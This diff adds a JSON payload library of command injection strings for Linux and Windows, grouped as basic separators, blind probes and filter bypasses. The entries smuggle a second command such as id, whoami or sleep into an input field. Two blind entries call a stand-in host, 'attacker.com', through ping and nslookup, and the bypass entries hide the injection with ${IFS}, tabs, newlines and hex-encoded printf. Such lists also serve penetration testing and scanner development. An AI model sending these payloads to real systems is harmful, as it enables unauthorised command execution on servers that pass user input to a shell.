@@ -1,0 +1,307 @@
+{
+    "category": "CMDi",
+    "description": "Command Injection payloads for executing system commands",
+    "payloads": [
+        {
+            "id": "cmdi-basic-001",
+            "title": "Semicolon Linux",
+            "payload": "; id",
+            "category": "CMDi",
+            "subcategory": "Basic",
+            "context": [
+                "input",
+                "parameter"
+            ],
+            "level": "low",
+            "tags": [
+                "basic",
+                "linux",
+                "semicolon"
+            ],
+            "notes": "Command separator with id",
+            "source": "github"
+        },
+        {
+            "id": "cmdi-basic-002",
+            "title": "Pipe Command",
+            "payload": "| id",
+            "category": "CMDi",
+            "subcategory": "Basic",
+            "context": [
+                "input",
+                "parameter"
+            ],
+            "level": "low",
+            "tags": [
+                "basic",
+                "pipe",
+                "linux"
+            ],
+            "notes": "Pipe to id command",
+            "source": "github"
+        },
+        {
+            "id": "cmdi-basic-003",
+            "title": "AND Operator",
+            "payload": "&& id",
+            "category": "CMDi",
+            "subcategory": "Basic",
+            "context": [
+                "input",
+                "parameter"
+            ],
+            "level": "low",
+            "tags": [
+                "basic",
+                "and",
+                "linux"
+            ],
+            "notes": "AND operator execution",
+            "source": "github"
+        },
+        {
+            "id": "cmdi-basic-004",
+            "title": "OR Operator",
+            "payload": "|| id",
+            "category": "CMDi",
+            "subcategory": "Basic",
+            "context": [
+                "input",
+                "parameter"
+            ],
+            "level": "low",
+            "tags": [
+                "basic",
+                "or",
+                "linux"
+            ],
+            "notes": "OR operator execution",
+            "source": "github"
+        },
+        {
+            "id": "cmdi-basic-005",
+            "title": "Backtick Substitution",
+            "payload": "`id`",
+            "category": "CMDi",
+            "subcategory": "Basic",
+            "context": [
+                "input",
+                "parameter"
+            ],
+            "level": "medium",
+            "tags": [
+                "basic",
+                "backtick",
+                "substitution"
+            ],
+            "notes": "Command substitution with backticks",
+            "source": "github"
+        },
+        {
+            "id": "cmdi-basic-006",
+            "title": "Dollar Substitution",
+            "payload": "$(id)",
+            "category": "CMDi",
+            "subcategory": "Basic",
+            "context": [
+                "input",
+                "parameter"
+            ],
+            "level": "medium",
+            "tags": [
+                "basic",
+                "dollar",
+                "substitution"
+            ],
+            "notes": "Modern command substitution",
+            "source": "github"
+        },
+        {
+            "id": "cmdi-windows-001",
+            "title": "Windows Ampersand",
+            "payload": "& whoami",
+            "category": "CMDi",
+            "subcategory": "Windows",
+            "context": [
+                "input",
+                "parameter"
+            ],
+            "level": "low",
+            "tags": [
+                "windows",
+                "ampersand",
+                "cmd"
+            ],
+            "notes": "Windows command separator",
+            "source": "github"
+        },
+        {
+            "id": "cmdi-windows-002",
+            "title": "Windows Pipe",
+            "payload": "| whoami",
+            "category": "CMDi",
+            "subcategory": "Windows",
+            "context": [
+                "input",
+                "parameter"
+            ],
+            "level": "low",
+            "tags": [
+                "windows",
+                "pipe",
+                "cmd"
+            ],
+            "notes": "Windows pipe command",
+            "source": "github"
+        },
+        {
+            "id": "cmdi-windows-003",
+            "title": "Windows Dir",
+            "payload": "& dir",
+            "category": "CMDi",
+            "subcategory": "Windows",
+            "context": [
+                "input",
+                "parameter"
+            ],
+            "level": "low",
+            "tags": [
+                "windows",
+                "dir",
+                "listing"
+            ],
+            "notes": "Windows directory listing",
+            "source": "github"
+        },
+        {
+            "id": "cmdi-blind-001",
+            "title": "Blind Sleep",
+            "payload": "; sleep 10",
+            "category": "CMDi",
+            "subcategory": "Blind",
+            "context": [
+                "input",
+                "parameter"
+            ],
+            "level": "medium",
+            "tags": [
+                "blind",
+                "sleep",
+                "time"
+            ],
+            "notes": "Time-based blind injection",
+            "source": "github"
+        },
+        {
+            "id": "cmdi-blind-002",
+            "title": "Blind Ping",
+            "payload": "; ping -c 3 attacker.com",
+            "category": "CMDi",
+            "subcategory": "Blind",
+            "context": [
+                "input",
+                "parameter"
+            ],
+            "level": "medium",
+            "tags": [
+                "blind",
+                "ping",
+                "oob"
+            ],
+            "notes": "Out-of-band detection via ping",
+            "source": "github"
+        },
+        {
+            "id": "cmdi-blind-003",
+            "title": "Blind nslookup",
+            "payload": "; nslookup attacker.com",
+            "category": "CMDi",
+            "subcategory": "Blind",
+            "context": [
+                "input",
+                "parameter"
+            ],
+            "level": "medium",
+            "tags": [
+                "blind",
+                "dns",
+                "oob"
+            ],
+            "notes": "DNS-based out-of-band",
+            "source": "github"
+        },
+        {
+            "id": "cmdi-bypass-001",
+            "title": "Newline Bypass",
+            "payload": "%0aid",
+            "category": "CMDi",
+            "subcategory": "Filter Bypass",
+            "context": [
+                "input",
+                "url"
+            ],
+            "level": "medium",
+            "tags": [
+                "bypass",
+                "newline",
+                "url"
+            ],
+            "notes": "Newline character bypass",
+            "source": "github"
+        },
+        {
+            "id": "cmdi-bypass-002",
+            "title": "Tab Bypass",
+            "payload": ";\tid",
+            "category": "CMDi",
+            "subcategory": "Filter Bypass",
+            "context": [
+                "input"
+            ],
+            "level": "medium",
+            "tags": [
+                "bypass",
+                "tab",
+                "whitespace"
+            ],
+            "notes": "Tab character instead of space",
+            "source": "github"
+        },
+        {
+            "id": "cmdi-bypass-003",
+            "title": "IFS Bypass",
+            "payload": ";${IFS}id",
+            "category": "CMDi",
+            "subcategory": "Filter Bypass",
+            "context": [
+                "input"
+            ],
+            "level": "high",
+            "tags": [
+                "bypass",
+                "ifs",
+                "space"
+            ],
+            "notes": "IFS variable for space bypass",
+            "source": "github"
+        },
+        {
+            "id": "cmdi-bypass-004",
+            "title": "Hex Bypass",
+            "payload": "$(printf '\\x69\\x64')",
+            "category": "CMDi",
+            "subcategory": "Filter Bypass",
+            "context": [
+                "input"
+            ],
+            "level": "high",
+            "tags": [
+                "bypass",
+                "hex",
+                "printf"
+            ],
+            "notes": "Hex encoded 'id' command",
+            "source": "github"
+        }
+    ]
+}
